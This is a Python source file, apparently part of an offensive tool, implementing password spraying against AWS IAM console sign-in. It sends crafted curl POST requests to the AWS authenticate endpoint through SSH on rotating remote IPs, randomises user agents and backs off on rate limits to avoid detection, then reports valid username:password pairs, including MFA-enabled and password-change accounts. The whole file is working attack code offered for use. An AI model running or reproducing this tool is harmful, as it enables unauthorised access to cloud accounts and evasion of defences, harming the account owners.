import time
import json
import paramiko
import random
import itertools

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

def run_ssh_command(host, username, key_path, command):
    ssh_response = ""
    try:
        key = paramiko.RSAKey.from_private_key_file(key_path)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, username=username, pkey=key)
        stdin, stdout, stderr = ssh.exec_command(command)
        ssh_response = stdout.read().decode().strip()
        ssh.close()
    except Exception as e:
        ssh_response = f"SSH error: {e}"
        print('An error occurred with the SSH connection.\nCheck IP addresses and EC2 configurations and try again.')
        quit()
    return ssh_response

def ssh_spray(args):
    found_creds = 0
    timeout = args.timeout if args.timeout else 2

    ssh_user = args.username
    ssh_key_path = args.keyfile

    print("Password spraying provided IAM usernames via remote SSH. Please be patient...")

    with open(args.read) as input_usernames:
        # Check if we're using an IP file
        if args.ipfile:
            with open(args.ipfile) as ip_file:
                ip_list = [line.strip() for line in ip_file if line.strip()]
            ip_cycle = itertools.cycle(ip_list)
        else:
            ip_cycle = None  # No need to cycle, we'll just use the single IP

        for line in input_usernames:
            username = line.strip()
            random_user_agent = random.choice(user_agents)

            time.sleep(int(timeout))

            # Build curl command to be executed remotely
            curl_command = f"""curl -s -X POST https://signin.aws.amazon.com:443/authenticate \\
            -H "User-Agent: {random_user_agent}" \\
            -H "Content-Type: application/x-www-form-urlencoded" \\
            --data-urlencode "account={args.account}" \\
            --data-urlencode "action=iam-user-authentication" \\
            --data-urlencode "client_id=arn:aws:signin:::console/canvas" \\
            --data-urlencode "password={args.password}" \\
            --data-urlencode "redirect_uri=https://console.aws.amazon.com" \\
            --data-urlencode "rememberAccount=false" \\
            --data-urlencode "username={username}" """

            # If using a single IP address (args.ip)
            if args.ip:
                ip = args.ip
                ssh_response = run_ssh_command(ip, ssh_user, ssh_key_path, curl_command)
            
            # If using an IP file (args.ipfile), cycle through the IPs
            elif args.ipfile and ip_cycle:
                ip = str(next(ip_cycle))  # Cycle through the IPs in the list
                print(f'[!] Rotated IP: {ip}')
                ssh_response = run_ssh_command(ip, ssh_user, ssh_key_path, curl_command)

            try:
                response_data = json.loads(ssh_response)
                if args.verbose:
                    print(f"Username: {username}")
                    print(json.dumps(response_data, indent=2))
            except:
                print("[-] Failed to parse remote response. Possibly rate-limited or bad data.")
                print(f"Raw response:\n{ssh_response}")
                time.sleep(20)
                timeout = 10
                continue

            usercreds = f"{username}:{args.password}"

            # Evaluate authentication result
            if "SUCCESS" in response_data.get("state", "") and "CHANGE_PASSWORD" in response_data.get("properties", {}).get("result", ""):
                found_creds += 1
                print(f"[+] Valid Credentials Found (Password Change REQUIRED): {usercreds}")
                print(f"Visit https://{args.account}.signin.aws.amazon.com/console and log in with the credentials.")
                continue_check = input("Do you want to continue? (y/n) ")
                if continue_check.lower() == "y":
                    continue
                else:
                    print("Quitting...")
                    quit()
            elif "SUCCESS" in response_data.get("state", "") and "MFA" not in response_data.get("properties", {}).get("result", "") and "CHANGE_PASSWORD" not in response_data.get("properties", {}).get("result", ""):
                found_creds += 1
                print(f"[+] Valid Credentials Found: {usercreds}")
                continue_check = input("Do you want to continue? (y/n) ")
                if continue_check.lower() == "y":
                    continue
                else:
                    print("Quitting...")
                    quit()
            elif "SUCCESS" in response_data.get("state", "") and "MFA" in response_data.get("properties", {}).get("result", "") and "CHANGE_PASSWORD" not in response_data.get("properties", {}).get("result", ""):
                found_creds += 1
                print(f"[+] Valid Credentials Found (MFA Enabled): {usercreds}")
                continue_check = input("Do you want to continue? (y/n) ")
                if continue_check.lower() == "y":
                    continue
                else:
                    print("Quitting...")
                    quit()
            else:
                pass
    if found_creds >= 1:
        print(f"\n[✓] {found_creds} valid user credentials identified. Finished.")
    else:
        print('\n[-] No valid credentials identified. Finished.')
